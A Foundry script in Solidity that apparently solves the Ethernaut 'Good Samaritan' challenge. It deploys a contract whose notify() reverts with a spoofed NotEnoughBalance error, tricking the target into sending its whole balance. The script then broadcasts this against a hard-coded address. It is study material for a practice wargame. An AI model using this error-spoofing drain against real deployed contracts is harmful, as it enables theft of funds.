// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GreedyPerson is INotifyable {

    error NotEnoughBalance();

    function requestGreedyDonationFrom(address goodSamaritan_) external {
        IGoodSamaritan(goodSamaritan_).requestDonation();
    }

    function notify(uint256 amount_) external pure override {
        if(amount_ == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanScript is Script {
    address goodSamaritan = 0xB4d191b85B1785c109588f8b34c6A71d73663502;

    function run() public {
        vm.startBroadcast();

        GreedyPerson greedyPerson = new GreedyPerson();
        greedyPerson.requestGreedyDonationFrom(goodSamaritan);

        vm.stopBroadcast();
    }
}
